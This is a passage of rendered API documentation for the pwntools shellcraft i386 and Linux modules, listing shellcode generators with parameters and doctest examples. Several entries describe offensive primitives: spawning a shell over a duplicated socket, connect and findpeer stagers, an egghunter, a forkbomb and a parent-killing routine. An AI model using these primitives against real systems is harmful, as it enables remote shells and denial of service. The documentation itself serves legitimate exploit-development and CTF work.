<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">strcpy</span><span class="p">(</span><span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="s1">&#39;eax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;get_str: call pop_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;.asciz &quot;Hello, world</span><span class="se">\\</span><span class="s1">n&quot;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, world\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.strlen">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">strlen</code><span class="sig-paren">(</span><em>string</em>, <em>reg='ecx'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/strlen.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.strlen" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculate the length of the specified string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Register or address with the string</li>
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Named register to return the value in,
ecx is the default.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="s1">&#39;jmp get_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;pop_str: pop eax</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">strlen</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;push ecx;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;get_str: call pop_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;.asciz &quot;Hello, world</span><span class="se">\\</span><span class="s1">n&quot;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">()</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="s1">&#39;Hello, world</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.trap">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>A trap instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.xor">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">xor</code><span class="sig-paren">(</span><em>key</em>, <em>address</em>, <em>count</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/xor.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.xor" title="Permalink to this definition">¶</a></dt>
<dd><p>XORs data a constant value.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>key</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; XOR key either as a 4-byte integer,
If a string, length must be a power of two,
and not longer than 4 bytes.
Alternately, may be a register.</li>
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the data (e.g. 0xdead0000, &#8216;esp&#8217;)</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to XOR, or a register containing
the number of bytes to XOR.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">xor</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expected</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">==</span> <span class="n">expected</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.i386.linux">
<span id="pwnlib-shellcraft-i386-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.i386.linux" title="pwnlib.shellcraft.i386.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.i386.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.i386.linux" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing Intel i386 shellcodes for Linux.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.acceptloop_ipv4">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">acceptloop_ipv4</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/acceptloop_ipv4.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.acceptloop_ipv4" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the listening port</td>
</tr>
</tbody>
</table>
<p>Waits for a connection.  Leaves socket in EBP.
ipv4 only</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.cat">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s1">&#39;FLAG&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="n">f</span><span class="p">))</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;FLAG&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.connect">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Leaves the connected socket in edx</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>host</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Remote IP address or hostname (as a dotted quad / string)</li>
<li><strong>port</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Remote port</li>
<li><strong>network</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Network protocol (ipv4 or ipv6)</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;edx&#39;</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">fam</span><span class="o">=</span><span class="s1">&#39;ipv6&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;::1&#39;</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">,</span> <span class="s1">&#39;ipv6&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.connectstager">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">connectstager</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/connectstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.connectstager" title="Permalink to this definition">¶</a></dt>
<dd><p>connect recvsize stager
:param host, where to connect to:
:param port, which port to connect to:
:param network, ipv4 or ipv6? (default: ipv4)</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.dir">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">dir</code><span class="sig-paren">(</span><em>in_fd='ebp'</em>, <em>size=2048</em>, <em>allocate_stack=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/dir.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.dir" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads to the stack from a directory.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>in_fd</strong> (<em>int/str</em>) &#8211; File descriptor to be read from.</li>
<li><strong>size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Buffer size.</li>
<li><strong>allocate_stack</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; allocate &#8216;size&#8217; bytes on the stack.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>You can optioanlly shave a few bytes not allocating the stack space.</p>
<p>The size read is left in eax.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.dupio">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">dupio</code><span class="sig-paren">(</span><em>sock='ebp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/dupio.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.dupio" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = ebp]
Duplicates sock to stdin, stdout and stderr</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.dupsh">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">dupsh</code><span class="sig-paren">(</span><em>sock='ebp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/dupsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.dupsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = ebp]
Duplicates sock to stdin, stdout and stderr and spawns a shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.echo">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock='1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.egghunter">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">egghunter</code><span class="sig-paren">(</span><em>egg</em>, <em>start_address = 0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/egghunter.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.egghunter" title="Permalink to this definition">¶</a></dt>
<dd><p>Searches memory for the byte sequence &#8216;egg&#8217;.</p>
<p>Return value is the address immediately following the match,
stored in RDI.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>egg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>, </em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; String of bytes, or word-size integer to search for</li>
<li><strong>start_address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Where to start the search</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.findpeer">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">findpeer</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/findpeer.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.findpeer" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: port (defaults to any port)
Finds a socket, which is connected to the specified port.
Leaves socket in ESI.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.findpeersh">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">findpeersh</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/findpeersh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.findpeersh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: port (defaults to any)
Finds an open socket which connects to a specified
port, and then opens a dup2 shell on it.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.findpeerstager">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">findpeerstager</code><span class="sig-paren">(</span><em>port=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/findpeerstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.findpeerstager" title="Permalink to this definition">¶</a></dt>
<dd><p>Findpeer recvsize stager
:param port, the port given to findpeer:
:type port, the port given to findpeer: defaults to any</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.forkbomb">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">forkbomb</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/forkbomb.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.forkbomb" title="Permalink to this definition">¶</a></dt>
<dd><p>Performs a forkbomb attack.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.i386_to_amd64">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">i386_to_amd64</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/i386_to_amd64.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.i386_to_amd64" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns code to switch from i386 to amd64 mode.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.killparent">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">killparent</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/killparent.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.killparent" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills its parent process until whatever the parent is (probably init)
cannot be killed any longer.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.loader">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">loader</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/loader.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.loader" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the ELF as a register or integer.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.linux.loader_append">
<code class="descclassname">pwnlib.shellcraft.i386.linux.</code><code class="descname">loader_append</code><span class="sig-paren">(</span><em>data=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/linux/loader_append.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.linux.loader_append" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<p>Similar to loader.asm but loads an appended ELF.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; If a valid filename, the data is loaded from the named file.
Otherwise, this is treated as raw ELF data to append.
If <code class="docutils literal"><span class="pre">None</span></code>, it is ignored.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;-m32&#39;</span><span class="p">,</span><span class="s1">&#39;-xc&#39;</span><span class="p">,</span><span class="s1">&#39;-static&#39;</span><span class="p">,</span><span class="s1">&#39;-Wl,-Ttext-segment=0x20000000&#39;</span><span class="p">,</span><span class="s1">&#39;-&#39;</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
<span class="gp">... </span><span class="s1">int main() {</span>
<span class="gp">... </span><span class="s1">    printf(&quot;Hello, </span><span class="si">%s</span><span class="s1">!</span><span class="se">\\</span><span class="s1">n&quot;, &quot;i386&quot;);</span>
<span class="gp">... </span><span class="s1">}</span>
<span class="gp">... </span><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">gcc</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
